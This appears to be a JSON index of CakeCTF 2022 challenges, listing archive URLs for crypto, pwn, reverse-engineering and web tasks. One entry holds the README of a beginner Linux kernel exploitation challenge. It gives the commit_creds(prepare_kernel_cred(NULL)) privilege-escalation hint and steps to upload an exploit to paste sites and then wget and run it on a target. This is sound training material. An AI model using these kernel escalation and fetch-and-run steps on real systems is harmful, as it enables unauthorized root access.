{"crypto": [{"name": "brand new crypto", "attach": ["https://raw.githubusercontent.com/sajjadium/ctf-archives/main/ctfs/CakeCTF/2022/crypto/brand_new_crypto/output.txt", "https://raw.githubusercontent.com/sajjadium/ctf-archives/main/ctfs/CakeCTF/2022/crypto/brand_new_crypto/task.py"]}, {"name": "frozen cake", "attach": ["https://raw.githubusercontent.com/sajjadium/ctf-archives/main/ctfs/CakeCTF/2022/crypto/frozen_cake/output.txt", "https://raw.githubusercontent.com/sajjadium/ctf-archives/main/ctfs/CakeCTF/2022/crypto/frozen_cake/task.py"]}, {"name": "hi yoshiking", "attach": ["https://raw.githubusercontent.com/sajjadium/ctf-archives/main/ctfs/CakeCTF/2022/crypto/hi_yoshiking/server.rb"]}, {"name": "rock door", "attach": ["https://raw.githubusercontent.com/sajjadium/ctf-archives/main/ctfs/CakeCTF/2022/crypto/rock_door/server.py"]}], "pwn": [{"name": "crc32pwn", "attach": ["https://raw.githubusercontent.com/sajjadium/ctf-archives/main/ctfs/CakeCTF/2022/pwn/crc32pwn/01_build.sh", "https://raw.githubusercontent.com/sajjadium/ctf-archives/main/ctfs/CakeCTF/2022/pwn/crc32pwn/02_start.sh", "https://raw.githubusercontent.com/sajjadium/ctf-archives/main/ctfs/CakeCTF/2022/pwn/crc32pwn/Dockerfile", "https://raw.githubusercontent.com/sajjadium/ctf-archives/main/ctfs/CakeCTF/2022/pwn/crc32pwn/crc32sum", "https://raw.githubusercontent.com/sajjadium/ctf-archives/main/ctfs/CakeCTF/2022/pwn/crc32pwn/crc32sum.c", "https://raw.githubusercontent.com/sajjadium/ctf-archives/main/ctfs/CakeCTF/2022/pwn/crc32pwn/flag.txt"]}, {"name": "smal arey", "attach": ["https://raw.githubusercontent.com/sajjadium/ctf-archives/main/ctfs/CakeCTF/2022/pwn/smal_arey/chall", "https://raw.githubusercontent.com/sajjadium/ctf-archives/main/ctfs/CakeCTF/2022/pwn/smal_arey/ld-2.31.so", "https://raw.githubusercontent.com/sajjadium/ctf-archives/main/ctfs/CakeCTF/2022/pwn/smal_arey/libc-2.31.so", "https://raw.githubusercontent.com/sajjadium/ctf-archives/main/ctfs/CakeCTF/2022/pwn/smal_arey/main.c"]}, {"name": "str vs cstr", "attach": ["https://raw.githubusercontent.com/sajjadium/ctf-archives/main/ctfs/CakeCTF/2022/pwn/str_vs_cstr/chall", "https://raw.githubusercontent.com/sajjadium/ctf-archives/main/ctfs/CakeCTF/2022/pwn/str_vs_cstr/main.cpp"]}, {"name": "welkerme", "attach": ["https://raw.githubusercontent.com/sajjadium/ctf-archives/main/ctfs/CakeCTF/2022/pwn/welkerme/Makefile", "https://raw.githubusercontent.com/sajjadium/ctf-archives/main/ctfs/CakeCTF/2022/pwn/welkerme/README.ja.md", "https://raw.githubusercontent.com/sajjadium/ctf-archives/main/ctfs/CakeCTF/2022/pwn/welkerme/debug.sh", "https://raw.githubusercontent.com/sajjadium/ctf-archives/main/ctfs/CakeCTF/2022/pwn/welkerme/exploit.c", "https://raw.githubusercontent.com/sajjadium/ctf-archives/main/ctfs/CakeCTF/2022/pwn/welkerme/run.sh", null, null], "desc": "# welkerme\nWelcome to Kernel Exploit!\nIn this challenge, you're going to learn how to escalate privilege in Linux kernel.\nThe goal is to read the flag written in `/root/flag.txt` on the remote server.\n\n## First Step\n### Setup\nInstall qemu, cpio, and some developer tools.\n```\n# apt install qemu-system cpio gcc gdb make\n```\n\n### Run\nYou can run VM with the following command:\n```\n$ make run\n```\n\n### Debug\nYou can also debug QEMU. First, run the VM by\n```\n$ make debug\n```\nand then attach to port 12345 with gdb.\n```\n$ gdb\ngdb> target remote localhost:12345\n```\nIf you can't use this port number for some reason,\nyou can change it by changing the last line of `debug.sh`.\n\n## Developing Exploit\nThe OS is running a vulnerable kernel module.\n```\n[ welkerme - CakeCTF 2022 ]\n/ $ lsmod\nModule                  Size  Used by    Tainted: G  \ndriver                 16384  0\n```\nYou can find the source code of this driver in `src/driver.c`.\nProbably you should check `module_ioctl` function :)\n\nEdit `exploit.c` to develop your exploit.\n\n## Testing on Remote\nIf you successfully finish writing your exploit,\nyou can try it on the remote server.\n\n### Proof-of-Work\nYou will be asked to solve a Proof-of-Work first.\n```\n$ nc pwn2.2022.cakectf.com 9999\nhashcash -mb26 x3.lIBh9s\nhashcash token: \n```\nOpen a new terminal and keep the connection of the PoW above.\nInstall `hashcash` if you don't have one.\n```\n# apt install hashcash\n```\nRun the command given by the server and you'll get something like this:\n```\n$ hashcash -mb26 x3.lIBh9s\nhashcash token: 1:26:220902:x3.libh9s::7icDDK3+4NzsByUH:00000002pd8m\nhashcash -mb26 x3.lIBh9s  5.79s user 0.00s system 99% cpu 5.797 total\n```\nYou must send the token to get access to the challenge.\n```\n$ nc pwn2.2022.cakectf.com 9999\nhashcash -mb26 x3.lIBh9s\nhashcash token: \n1:26:220902:x3.libh9s::7icDDK3+4NzsByUH:00000002pd8m\n...\n```\nFeel free to ask admin on Discord if you have any trouble about PoW.\n\n### Sending Your Exploit\nIf you have your own server, you can simply download your exploit\nfrom your server. (HTTP only!)\n```\n/ $ cd /tmp\n/tmp $ wget http://<your server>/exploit\n```\n\nIf you don't have your own server, you may use [sprunge](http://sprunge.us/)\nor [termbin](http://termbin.com/).\nFirst, upload your exploit to the server.\n```\n# sprunge\n$ base64 exploit | curl -F 'sprunge=<-' http://sprunge.us\nhttp://sprunge.us/XXXXXX\n\n# termbin (File size must be small enough)\n$ base64 exploit | nc termbin.com 9999\nhttps://termbin.com/YYYY\n```\nAs shown in the example above, use base64 or the file may corrupt.\nAlso, be noted that termbin only accepts small files. You can use [musl-gcc](https://www.musl-libc.org/how.html) to make a small binary if you choose to use termbin.\nAfter finishing upload, you can download the exploit from the URL generated.\n```\n/ $ cd /tmp\n\n# sprunge\n/tmp $ wget http://sprunge.us/XXXXXX -O exploit.b64\n/tmp $ base64 -d exploit.b64 > exploit\n/tmp $ chmod +x exploit\n\n# termbin (Change https to http!)\n/tmp $ wget http://termbin.com/YYYY -O exploit.b64\n/tmp $ base64 -d exploit.b64 > exploit\n/tmp $ chmod +x exploit\n```\n\n## Hint\nThe function `func` in `exploit.c` is executed in the kernel space by `CMD_EXEC`.\nBasically, you want to run the following code in the kernel space to escalate privilege.\n```c\ncommit_creds(prepare_kernel_cred(NULL));\n```\n`prepare_kernel_cred(NULL)` creates a new credential with the highest privilege.\n`commit_creds(cred)` applies the credential to the caller process.\n\nYou can find the address of each function in `/proc/kallsyms`. (Use debug mode)\n```\n/ # grep commit_creds /proc/kallsyms \nffffffff81072540 T commit_creds\n```\nGood luck!\n\n## Good Readings\nI believe this challenge is the easiest kernel exploit.\nIf you're stuck, however, the following websites may help you.\nBe noted these posts explain a bit more complex exploit than this challenge.\n\n- [Learning Linux Kernel Exploitation](https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/#the-simplest-exploit---ret2usr) by Midas (English)\n- [Linux Kernel Exploit \u5185\u6838\u6f0f\u6d1e\u5b66\u4e60(2)-ROP](https://bbs.pediy.com/thread-253377.htm#msg_header_h1_5) by \u949esir (Chinese)\n- [PAWNYABLE!](https://pawnyable.cafe/linux-kernel/) by ptr-yudai (Japanese)\n- [Exploit Tech: ret2usr](https://learn.dreamhack.io/82#t572) by Dreamhack (Korean)\n\nLast but not least, Google search is always with you.\n"}], "rev": [{"name": "kiwi", "attach": ["https://raw.githubusercontent.com/sajjadium/ctf-archives/main/ctfs/CakeCTF/2022/rev/kiwi/chall", "https://raw.githubusercontent.com/sajjadium/ctf-archives/main/ctfs/CakeCTF/2022/rev/kiwi/flag.txt"]}, {"name": "luau", "attach": ["https://raw.githubusercontent.com/sajjadium/ctf-archives/main/ctfs/CakeCTF/2022/rev/luau/libflag.lua", "https://raw.githubusercontent.com/sajjadium/ctf-archives/main/ctfs/CakeCTF/2022/rev/luau/main.lua"]}, {"name": "nimrev", "attach": ["https://raw.githubusercontent.com/sajjadium/ctf-archives/main/ctfs/CakeCTF/2022/rev/nimrev/chall"]}, {"name": "zundamon", "attach": ["https://raw.githubusercontent.com/sajjadium/ctf-archives/main/ctfs/CakeCTF/2022/rev/zundamon/evidence.pcapng.xz", "https://raw.githubusercontent.com/sajjadium/ctf-archives/main/ctfs/CakeCTF/2022/rev/zundamon/zundamon"]}], "web": [{"name": "cakegear", "attach": ["https://raw.githubusercontent.com/sajjadium/ctf-archives/main/ctfs/CakeCTF/2022/web/cakegear/Dockerfile", "https://raw.githubusercontent.com/sajjadium/ctf-archives/main/ctfs/CakeCTF/2022/web/cakegear/admin.php", "https://raw.githubusercontent.com/sajjadium/ctf-archives/main/ctfs/CakeCTF/2022/web/cakegear/index.php"]}, {"name": "imagesurfing", "attach": ["https://raw.githubusercontent.com/sajjadium/ctf-archives/main/ctfs/CakeCTF/2022/web/imagesurfing/Dockerfile", "https://raw.githubusercontent.com/sajjadium/ctf-archives/main/ctfs/CakeCTF/2022/web/imagesurfing/flag.txt", "https://raw.githubusercontent.com/sajjadium/ctf-archives/main/ctfs/CakeCTF/2022/web/imagesurfing/index.php"]}, {"name": "openbio", "attach": [null, "https://raw.githubusercontent.com/sajjadium/ctf-archives/main/ctfs/CakeCTF/2022/web/openbio/docker-compose.yml", null, null]}, {"name": "panda memo", "attach": ["https://raw.githubusercontent.com/sajjadium/ctf-archives/main/ctfs/CakeCTF/2022/web/panda_memo/Dockerfile", "https://raw.githubusercontent.com/sajjadium/ctf-archives/main/ctfs/CakeCTF/2022/web/panda_memo/package.json", "https://raw.githubusercontent.com/sajjadium/ctf-archives/main/ctfs/CakeCTF/2022/web/panda_memo/server.js", null]}]}